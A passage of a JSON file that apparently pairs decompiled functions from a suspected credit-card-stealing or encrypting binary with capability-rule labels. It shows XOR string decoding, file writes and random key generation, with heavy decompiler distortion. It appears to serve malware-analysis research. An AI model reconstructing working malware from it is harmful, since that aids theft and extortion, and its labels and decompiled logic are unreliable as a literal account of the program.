{
    "00401260": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401301) overlaps instruction at (ram,0x004012fe)\n// \n// WARNING: Removing unreachable block (ram,0x0040139b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401260(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uchar *in_ECX;\n    uint32_t in_EDX;\n    uint32_t extraout_EDX;\n    uchar *unaff_EBX;\n    uchar *unaff_ESI;\n    ushort in_SS;\n    bool in_CF;\n    bool bVar2;\n    uint16_t uStack18;\n    \n    if ((!in_CF) && (in_CF)) goto code_r0x0040126e;\n    *arg_8h = 0x55;\n    unaff_ESI = arg_8h;\n    while( true ) {\n        uStack18 = in_ECX;\n        unaff_ESI[1] = 0xd4;\n        unaff_ESI[2] = 0xe4;\n        uVar1 = in_ECX & 0xffff0000 | uStack18 & 0xff | ((in_ECX << 0x10) >> 0x18) - unaff_EBX << 8;\n        bVar2 = (POPCOUNT(uVar1 - in_EDX & 0xff) & 1U) == 0;\n        arg_8h[3] = 0xff;\n        if ((bVar2) || (!bVar2)) break;\n        segment(in_SS, *0x10 + -0x10);\n        if (uVar1 < in_EDX) goto code_r0x00401316;\n        if (!bVar2) break;\n        unaff_EBX = arg_8h + -1;\ncode_r0x0040126e:\n        unaff_ESI = unaff_ESI + -1;\n        func_0x101871f0();\n        in_ECX = unaff_EBX + 0x6c60875;\n        in_EDX = extraout_EDX;\n    }\n    while( true ) {\n        arg_8h[4] = 0xf9;\n        arg_8h[5] = 0x99;\ncode_r0x00401316:\n        arg_8h[6] = 0xc2;\n        arg_8h[7] = 0x18;\n        bVar2 = (in_ECX - 5U & 0x44) == 0;\n        arg_8h[8] = 0xd7;\n        if ((bVar2) || (!bVar2)) break;\n        if (in_ECX != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    arg_8h[9] = 0xc6;\n    *arg_ch = 10;\n    return;\n}\n",
        "token_count": 652
    },
    "00402900": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402900(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x424180, &lpBuffer, arg_8h);\n    fcn.004011c0(&var_4h, &var_8h);\n    fcn.00402a20(var_4h);\n    iVar1 = fcn.00401730(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403310(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 386
    },
    "00404950": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404980) overlaps instruction at (ram,0x0040497f)\n// \n// WARNING: Removing unreachable block (ram,0x00404980)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404950(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t in_ECX;\n    int32_t iVar5;\n    int32_t in_EDX;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t unaff_EDI;\n    uint16_t in_CS;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    uint32_t in_stack_ffffffc8;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    bVar8 = &stack0xfffffffc < 0x24;\n    bVar10 = &var_24h < 0;\n    bVar9 = *0x10 == 0x28;\n    if ((bVar10) || (!bVar10)) {\n        if (!bVar8 && !bVar9) goto code_r0x0040496b;\ncode_r0x00404979:\n        if (!bVar10) goto code_r0x0040497b;\n    }\n    else {\n        unaff_ESI = in_EAX + 0xe40ce22a;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        bVar8 = *(in_EAX + -0x1bf31dc8) < unaff_ESI;\n        uVar4 = *(in_EAX + -0x1bf31dc8);\n        bVar10 = uVar4 - unaff_ESI < 0;\n        bVar9 = uVar4 == unaff_ESI;\ncode_r0x0040496b:\n        if (!bVar8 && !bVar9) goto code_r0x00404979;\n        in_ECX = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - *unaff_EBX, in_ECX);\n        piVar1 = unaff_EDI + 0x78;\n        *piVar1 = *piVar1 - &stack0xffffffcc;\n        bVar10 = *piVar1 < 0;\n        in_stack_ffffffc8 = in_stack_ffffffc8 & 0xffff0000 | in_CS;\ncode_r0x0040497b:\n        if (bVar10) goto code_r0x0040497f;\n    }\n    in_ECX = arg_18h;\ncode_r0x0040497f:\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *(in_EDX + 7) = (*(in_EDX + 7) - (in_ECX >> 8)) - (*(unaff_EBX + 0x4d8b1c45) < in_ECX);\n    puVar3 = fcn.00402d10(in_ECX, unaff_ESI, 0x4241b0, in_stack_ffffffc8);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    bVar8 = puVar3 == NULL;\n    var_4h = puVar3;\n    if (bVar8) {\n        return 0;\n    }\n    if ((!bVar8) && (bVar8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar4 = 0;\n    var_24h = 0;\n    puVar7 = &var_23h;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = false;\n    uVar6 = 0;\n    bVar9 = true;\n    do {\n        if ((bVar8 || bVar9) || (!bVar8 && !bVar9)) {\n            uVar4 = (*pcVar2)();\n        }\n        else {\n            piVar1 = pcVar2 + -1;\n            *piVar1 = *piVar1 - &stack0xffffffc8;\n            uVar4 = uVar4 & 0xffffff00 | *(puVar3 + (uVar4 & 0xff));\n        }\n        uVar4 = uVar4 & 0x800000ff;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xffffff00) + 1;\n        }\n        (&var_24h)[uVar6] = uVar4;\n        uVar6 = uVar6 + 1;\n        bVar8 = uVar6 < 0x20;\n        bVar9 = uVar6 == 0x20;\n    } while (bVar8);\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.00404b00(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004037c0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 1349
    },
    "00401400": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00401400(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        do {\n            *(var_8h + arg_10h) = arg_14h ^ *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00401730": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401747) overlaps instruction at (ram,0x00401744)\n// \n\nchar * __cdecl fcn.00401730(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char *in_EAX;\n    int32_t arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    bool in_CF;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    uint var_4h;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_EAX = fcn.00402870();\n    }\n    else {\n        *in_EAX = *in_EAX + in_EAX;\n    }\n    *0x4245fc = in_EAX;\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 == -1) {\n        return NULL;\n    }\n    pcVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    bVar4 = pcVar1 == NULL;\n    while( true ) {\n        if (bVar4) {\n            return pcVar1;\n        }\n        bVar3 = false;\n        bVar5 = false;\n        bVar4 = *0x4245fc == NULL;\n        if (!bVar4) {\n            iVar2 = fcn.00401650(arg_8h_00);\n            bVar3 = (iVar2 != 0) != 0;\n            iVar2 = -(iVar2 != 0);\n            bVar5 = SCARRY4(iVar2, 1);\n            *0x4245fc = iVar2 + 1;\n            bVar4 = *0x4245fc == NULL;\n        }\n        if ((bVar3 || bVar4) || (!bVar3 && !bVar4)) break;\n        pcVar1 = *0x4245fc;\n        if (!bVar5) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00403310(0, arg_8h_00);\n    if (*0x4245fc == NULL) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 0x1;\n}\n",
        "token_count": 519
    },
    "004018d0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e82) overlaps instruction at (ram,0x00401e7e)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nulong fcn.004018d0(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    ushort extraout_CX;\n    char extraout_CH;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint extraout_ECX_09;\n    uint extraout_ECX_10;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint extraout_EDX_04;\n    uint16_t uVar6;\n    uint16_t uVar7;\n    int32_t unaff_EBX;\n    uint8_t *puVar8;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    char **ppcVar13;\n    char **ppcVar14;\n    char **ppcVar15;\n    uint *puVar16;\n    uint32_t unaff_EBP;\n    uint *puVar17;\n    uint16_t uVar18;\n    int32_t unaff_ESI;\n    uint uVar19;\n    uint *puVar20;\n    int16_t iVar21;\n    uint unaff_EDI;\n    uint uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uchar uVar25;\n    bool in_ZF;\n    bool bVar26;\n    uchar uVar27;\n    bool bVar28;\n    char cVar29;\n    uint8_t in_OF;\n    char cVar30;\n    ulong uVar31;\n    ulong uVar32;\n    unkbyte6 Var33;\n    uint uVar34;\n    uint32_t uVar9;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        in_OF = ((in_OF & 1) * 0x800 & 0x800) != 0;\n    }\n    uVar34 = 0x4018f2;\n    fcn.00401400(str.Y_vq1, 0x18, 0x424180, 10);\n    if ((in_OF) || (!in_OF)) {\n        uVar34 = 0x12;\n    }\n    cVar30 = '\\0';\n    uVar5 = extraout_ECX & *(extraout_ECX + 0x87cb1757);\n    cVar29 = uVar5 < 0;\n    bVar26 = uVar5 == 0;\n    uVar5 = fcn.00401400(str.Y_vq1, 0x18, 0x42418c, uVar34);\n    if ((bVar26 || cVar30 != cVar29) || (!bVar26 && cVar30 == cVar29)) {\n        fcn.00401400(str.Y_vq1, 0x18, 0x4241a0, 4);\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        *(uVar5 + 0x6a39da56) = *(uVar5 + 0x6a39da56) ^ extraout_ECX_00;\n        uVar2 = *0x6a004241;\n        pcVar1 = (uVar5 & 0xffffff00 | *0x6a004241) + 0x54;\n        *pcVar1 = (*pcVar1 - (extraout_ECX_00 >> 8)) - (0x97 < uVar5);\n        unaff_EDI = 0x83fffffa;\n        unaff_ESI = *(uVar5 & 0xffffff00 | uVar2 + (extraout_ECX_00 + 1 >> 8));\n    }\n    fcn.00401400(str.Y_vq1, 0x18, 0x4241a4, 0xc);\n    cVar30 = '\\0';\n    cVar29 = '\\0';\n    uVar31 = fcn.00401400(str.Y_vq1, 0x18, 0x4241b0, 7);\n    uVar5 = extraout_ECX_01;\n    if (cVar30 == cVar29) {\n        uVar5 = extraout_ECX_01 & 0xffff;\n    }\n    puVar10 = &stack0xffffffd8 ^ *(unaff_EBX + 0x6a);\n    uVar23 = *(unaff_ESI + -0x48);\n    pcVar1 = (uVar31 >> 0x20) + 0x19;\n    *pcVar1 = *pcVar1 + (uVar5 + 1 >> 8);\n    puVar10[-1] = str.Y_vq1;\n    puVar10[-2] = 0x4019c2;\n    uVar32 = fcn.00401400(puVar10[-1], *puVar10, puVar10[1], puVar10[2]);\n    puVar10[6] = uVar32;\n    puVar10[5] = extraout_ECX_02;\n    puVar10[4] = uVar32 >> 0x20;\n    puVar10[3] = unaff_EBX;\n    puVar10[2] = puVar10 + 7;\n    puVar10[1] = unaff_EBP | uVar23;\n    *puVar10 = uVar31;\n    puVar10[-1] = unaff_EDI;\n    uVar22 = puVar10[-1];\n    uVar19 = *puVar10;\n    uVar34 = puVar10[1];\n    uVar5 = puVar10[3];\n    puVar10[6] = 0xc;\n    puVar10[5] = 0x4241c4;\n    puVar10[4] = 0x18;\n    puVar10[3] = str.Y_vq1;\n    puVar10[2] = 0x4019df;\n    fcn.00401400(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    puVar10[6] = extraout_ECX_03;\n    puVar10[5] = uVar19;\n    puVar10[6] = 8;\n    puVar10[5] = 0x4241d0;\n    puVar10[4] = 0x18;\n    puVar10[3] = str.Y_vq1;\n    puVar10[2] = 0x401a15;\n    Var33 = fcn.00401400(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    *(puVar10 + 0x1a) = uVar5;\n    *(puVar10 + 6) = Var33 >> 0x20;\n    puVar10[5] = Var33;\n    uVar6 = *(puVar10 + 0x1a);\n    puVar10[6] = 0xd;\n    puVar10[5] = 0x4241d8;\n    puVar10[4] = 0x18;\n    puVar10[3] = str.Y_vq1;\n    puVar10[2] = 0x401a4d;\n    fcn.00401400(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    puVar10[6] = uVar22;\n    uVar19 = puVar10[6];\n    puVar10[6] = 0x18;\n    puVar10[5] = 0x4241e8;\n    puVar10[4] = 0x18;\n    puVar10[3] = str.Y_vq1;\n    puVar10[2] = 0x401a86;\n    fcn.00401400(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    puVar10[6] = uVar5 & 0xffff0000 | uVar6;\n    bVar26 = SCARRY1(uVar6 >> 8, '0');\n    puVar8 = puVar10[6];\n    puVar10[6] = 0x25;\n    puVar10[5] = 0x424200;\n    puVar10[4] = 0x18;\n    puVar10[3] = str.Y_vq1;\n    puVar10[2] = 0x401aa9;\n    fcn.00401400(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    if ((!bVar26) && (puVar10[2] = extraout_EDX,  bVar26)) {\n        uVar19 = puVar10[8];\n        uVar34 = puVar10[10];\n        *puVar10[3] = uVar34;\n        return CONCAT44(uVar19, uVar34);\n    }\n    puVar10[2] = 10;\n    puVar10[1] = 0x424228;\n    *puVar10 = 0x18;\n    puVar11 = puVar10 + -1;\n    puVar10[-1] = str.Y_vq1;\n    puVar10[-2] = 0x401adc;\n    fcn.00401400(puVar10[-1], *puVar10, puVar10[1], puVar10[2]);\n    if ((bVar26) || (!bVar26)) {\n        puVar11 = puVar10 + -2;\n        puVar10[-2] = 0xc;\n    }\n    bVar26 = (extraout_ECX_04 & *(extraout_ECX_04 + 0x87cb1757)) < 0;\n    puVar11[-1] = 0x424234;\n    puVar11[-2] = 0x18;\n    puVar12 = puVar11 + -3;\n    puVar11[-3] = str.Y_vq1;\n    puVar11[-4] = 0x401b06;\n    iVar4 = fcn.00401400(puVar11[-3], puVar11[-2], puVar11[-1], *puVar11);\n    if ((bVar26) || (!bVar26)) {\n        puVar12 = puVar11 + -4;\n        puVar11[-4] = 0xd;\n    }\n    *puVar8 = *puVar8 & 0xc3;\n    puVar12[-1] = 0x424240;\n    puVar12[-2] = 0x18;\n    puVar12[-3] = str.Y_vq1;\n    puVar12[-4] = 0x401b29;\n    fcn.00401400(puVar12[-3], puVar12[-2], puVar12[-1], *puVar12);\n    puVar12[0xc] = extraout_EDX_00;\n    *(puVar12 + 0x2e) = puVar8;\n    uVar6 = *(puVar12 + 0x2e);\n    puVar12[0xc] = 6;\n    puVar12[0xb] = 0x424250;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401b4e;\n    Var33 = fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    *(puVar12 + 0x32) = Var33 >> 0x20;\n    *(puVar12 + 0x2e) = Var33;\n    puVar12[0xc] = 5;\n    puVar12[0xb] = 0x424258;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401b79;\n    fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    puVar12[8] = 0xd;\n    puVar12[7] = 0x424260;\n    puVar12[6] = 0x18;\n    puVar12[5] = str.Y_vq1;\n    puVar12[4] = 0x401b9e;\n    uVar31 = fcn.00401400(puVar12[5], puVar12[6], puVar12[7], puVar12[8]);\n    puVar12[0xc] = uVar31;\n    puVar12[0xb] = extraout_ECX_05;\n    puVar12[10] = uVar31 >> 0x20;\n    puVar12[9] = puVar8 & 0xffff0000 | uVar6;\n    puVar12[8] = puVar12 + 0xd;\n    puVar12[7] = uVar34;\n    puVar12[6] = iVar4 + -0x1bf31dd6;\n    puVar12[5] = uVar19;\n    uVar23 = puVar12[5];\n    uVar5 = puVar12[6];\n    puVar17 = puVar12[7];\n    uVar34 = puVar12[9];\n    puVar12[0xc] = 0x19;\n    puVar12[0xb] = 0x424270;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401bd0;\n    fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    puVar12[0xc] = extraout_EDX_01;\n    *(puVar12 + 0x2e) = extraout_CX;\n    *(puVar12 + 0xb) = uVar23;\n    uVar6 = *(puVar12 + 0xb);\n    puVar12[0xc] = 0xf;\n    puVar12[0xb] = 0x42428c;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401c0c;\n    fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    puVar12[0xc] = uVar23 & 0xffff0000 | uVar6;\n    uVar24 = puVar12[0xc];\n    puVar12[0xc] = 0xe;\n    puVar12[0xb] = 0x42429c;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401c45;\n    fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    puVar12[0xc] = uVar34;\n    *(puVar12 + 0x2e) = extraout_DX;\n    iVar21 = uVar24;\n    *(puVar12 + 0xb) = iVar21;\n    bVar26 = uVar34 >> 8 < extraout_DX >> 8;\n    cVar30 = SBORROW2(iVar21, 1);\n    uVar6 = iVar21 - 1;\n    cVar29 = uVar6 < 0;\n    uVar27 = uVar6 == 0;\n    uVar25 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n    uVar6 = *(puVar12 + 0xb);\n    uVar23 = puVar12[0xc];\n    puVar12[0xc] = 0xb;\n    puVar12[0xb] = 0x4242ac;\n    puVar12[10] = 0x18;\n    puVar12[9] = str.Y_vq1;\n    puVar12[8] = 0x401c69;\n    fcn.00401400(puVar12[9], puVar12[10], puVar12[0xb], puVar12[0xc]);\n    ppcVar14 = puVar12 + 9;\n    if ((!bVar26 && !uVar27) && (ppcVar14 = puVar12 + 9,  bVar26 || uVar27)) {\n        ppcVar14 = puVar12 + 10;\n    }\n    ppcVar14[-1] = 0xb;\n    ppcVar14[-2] = 0x4242b8;\n    ppcVar14[-3] = 0x18;\n    ppcVar14[-4] = str.Y_vq1;\n    ppcVar14[-5] = 0x401c8d;\n    fcn.00401400(ppcVar14[-4], ppcVar14[-3], ppcVar14[-2], ppcVar14[-1]);\n    if ((!uVar25) && (uVar25)) {\n        ppcVar13 = ppcVar14 + -5;\n        ppcVar14[-5] = puVar17;\n        cVar29 = '\\x1e';\n        do {\n            puVar17 = puVar17 + -1;\n            ppcVar13 = ppcVar13 + -1;\n            *ppcVar13 = *puVar17;\n            cVar29 = cVar29 + -1;\n        } while ('\\0' < cVar29);\n        ppcVar14[-0x24] = ppcVar14 + -5;\n        uVar34 = in(0x78);\n        return CONCAT44(extraout_EDX_02, uVar34);\n    }\n    ppcVar14[-5] = 0xb;\n    ppcVar14[-6] = 0x4242c4;\n    ppcVar14[-7] = 0x18;\n    ppcVar14[-8] = str.Y_vq1;\n    ppcVar14[-9] = 0x401cbc;\n    fcn.00401400(ppcVar14[-8], ppcVar14[-7], ppcVar14[-6], ppcVar14[-5]);\n    if (!uVar27 && cVar30 == cVar29) {\n        *(ppcVar14 + -0x22) = uVar5;\n        uVar5 = uVar5 & 0xffff0000 | *(ppcVar14 + -0x22);\n    }\n    ppcVar14[-9] = 0xa;\n    ppcVar14[-10] = 0x4242d0;\n    ppcVar14[-0xb] = 0x18;\n    ppcVar14[-0xc] = str.Y_vq1;\n    ppcVar14[-0xd] = 0x401cdb;\n    fcn.00401400(ppcVar14[-0xc], ppcVar14[-0xb], ppcVar14[-10], ppcVar14[-9]);\n    *(ppcVar14 + 0xe) = uVar23;\n    *(ppcVar14 + 3) = uVar5;\n    ppcVar14[2] = uVar24 & 0xffff0000 | uVar6;\n    uVar24 = ppcVar14[2];\n    uVar18 = *(ppcVar14 + 3);\n    uVar6 = *(ppcVar14 + 0xe);\n    ppcVar14[3] = 0xc;\n    ppcVar14[2] = 0x4242dc;\n    ppcVar14[1] = 0x18;\n    *ppcVar14 = str.Y_vq1;\n    ppcVar14[-1] = 0x401d04;\n    fcn.00401400(*ppcVar14, ppcVar14[1], ppcVar14[2], ppcVar14[3]);\n    ppcVar14[3] = extraout_ECX_06;\n    ppcVar14[2] = extraout_EDX_03;\n    ppcVar14[3] = 0xe;\n    ppcVar14[2] = 0x4242e8;\n    ppcVar14[1] = 0x18;\n    *ppcVar14 = str.Y_vq1;\n    ppcVar14[-1] = 0x401d39;\n    fcn.00401400(*ppcVar14, ppcVar14[1], ppcVar14[2], ppcVar14[3]);\n    ppcVar14[3] = extraout_ECX_07;\n    ppcVar14[3] = 0x11;\n    ppcVar14[2] = 0x4242f8;\n    ppcVar14[1] = 0x18;\n    *ppcVar14 = str.Y_vq1;\n    ppcVar14[-1] = 0x401d5c;\n    fcn.00401400(*ppcVar14, ppcVar14[1], ppcVar14[2], ppcVar14[3]);\n    ppcVar14[3] = uVar23 & 0xffff0000 | uVar6;\n    *(ppcVar14 + 10) = extraout_DX_00;\n    *(ppcVar14 + 2) = uVar24;\n    uVar6 = *(ppcVar14 + 2);\n    uVar34 = ppcVar14[3];\n    ppcVar14[3] = 0x13;\n    ppcVar14[2] = 0x42430c;\n    ppcVar14[1] = 0x18;\n    *ppcVar14 = str.Y_vq1;\n    ppcVar14[-1] = 0x401d80;\n    fcn.00401400(*ppcVar14, ppcVar14[1], ppcVar14[2], ppcVar14[3]);\n    ppcVar14[3] = uVar34;\n    bVar26 = SCARRY1(uVar34 >> 8, '0');\n    uVar23 = ppcVar14[3];\n    ppcVar14[3] = 0x14;\n    ppcVar14[2] = 0x424320;\n    ppcVar14[1] = 0x18;\n    *ppcVar14 = str.Y_vq1;\n    ppcVar14[-1] = 0x401da3;\n    fcn.00401400(*ppcVar14, ppcVar14[1], ppcVar14[2], ppcVar14[3]);\n    if ((bVar26) || (!bVar26)) {\n        ppcVar15 = ppcVar14 + -1;\n        ppcVar14 = ppcVar14 + -1;\n        *ppcVar15 = 0x33;\n    }\n    ppcVar14[-1] = 0x424334;\n    ppcVar14[-2] = 0x18;\n    ppcVar14[-3] = str.Y_vq1;\n    ppcVar14[-4] = 0x401dcd;\n    fcn.00401400(ppcVar14[-3], ppcVar14[-2], ppcVar14[-1], *ppcVar14);\n    ppcVar14[4] = extraout_EDX_04;\n    *(ppcVar14 + 0xe) = uVar23;\n    uVar7 = *(ppcVar14 + 0xe);\n    uVar23 = (uVar23 >> 8 & 0xffff00) << 8;\n    uVar9 = uVar23 | uVar7;\n    ppcVar14[4] = 0xa;\n    ppcVar14[3] = 0x424368;\n    ppcVar14[2] = 0x18;\n    ppcVar14[1] = str.Y_vq1;\n    *ppcVar14 = 0x401e04;\n    uVar3 = fcn.00401400(ppcVar14[1], ppcVar14[2], ppcVar14[3], ppcVar14[4]);\n    *(ppcVar14 + 0x12) = uVar3;\n    *(ppcVar14 + 0xe) = extraout_ECX_08;\n    *(ppcVar14 + 10) = uVar5 & 0xffff0000 | uVar18;\n    puVar20 = *(ppcVar14 + 10);\n    ppcVar14[4] = 0x4;\n    ppcVar14[3] = 0x424374;\n    ppcVar14[2] = 0x18;\n    ppcVar14[1] = str.Y_vq1;\n    *ppcVar14 = 0x401e24;\n    fcn.00401400(ppcVar14[1], ppcVar14[2], ppcVar14[3], ppcVar14[4]);\n    ppcVar14[4] = extraout_ECX_09;\n    ppcVar14[4] = 0x5;\n    ppcVar14[3] = 0x424378;\n    ppcVar14[2] = 0x18;\n    ppcVar14[1] = str.Y_vq1;\n    *ppcVar14 = 0x401e47;\n    fcn.00401400(ppcVar14[1], ppcVar14[2], ppcVar14[3], ppcVar14[4]);\n    ppcVar14[4] = extraout_ECX_10;\n    bVar26 = false;\n    bVar28 = (extraout_ECX_10 - 1U & uVar6 | 0x61be) == 0;\n    ppcVar14[4] = 0x6;\n    ppcVar14[3] = 0x424380;\n    ppcVar14[2] = 0x18;\n    puVar16 = ppcVar14 + 1;\n    ppcVar14[1] = str.Y_vq1;\n    *ppcVar14 = 0x401e68;\n    uVar31 = fcn.00401400(ppcVar14[1], ppcVar14[2], ppcVar14[3], ppcVar14[4]);\n    puVar17 = uVar31;\n    if ((bVar26 || bVar28) || (uVar9 = uVar23 | uVar7 & 0xffff00ff,  !bVar26 && !bVar28)) {\n        *ppcVar14 = 0x2a;\n        ppcVar14[-1] = 0x4243b4;\n        puVar16 = ppcVar14 + -2;\n        ppcVar14[-2] = 0x18;\n    }\n    *(uVar24 & 0xffff0000 | uVar6) = *puVar20;\n    pcVar1 = (uVar31 >> 0x20) + 0x19;\n    *pcVar1 = *pcVar1 + (extraout_CH - *(puVar16 + -0x4c));\n    puVar17[-1] = str.Y_vq1;\n    puVar17[-2] = 0x401e95;\n    fcn.00401400(puVar17[-1], *puVar17, puVar17[1], puVar17[2]);\n    puVar17[6] = (uVar9 & 0xffff0000 | CONCAT11(0xdf, uVar9)) + 1;\n    puVar17[6] = 0xb;\n    puVar17[5] = 0x4243e0;\n    puVar17[4] = 0x18;\n    puVar17[3] = str.Y_vq1;\n    puVar17[2] = 0x401ec0;\n    uVar31 = fcn.00401400(puVar17[3], puVar17[4], puVar17[5], puVar17[6]);\n    return uVar31;\n}\n",
        "token_count": 6470
    },
    "00401ed0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402217) overlaps instruction at (ram,0x00402215)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401ed0(void)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    int16_t iVar5;\n    uint8_t extraout_AH;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    ushort extraout_CX;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    ushort extraout_CX_00;\n    ushort extraout_CX_01;\n    uint16_t uVar11;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    char 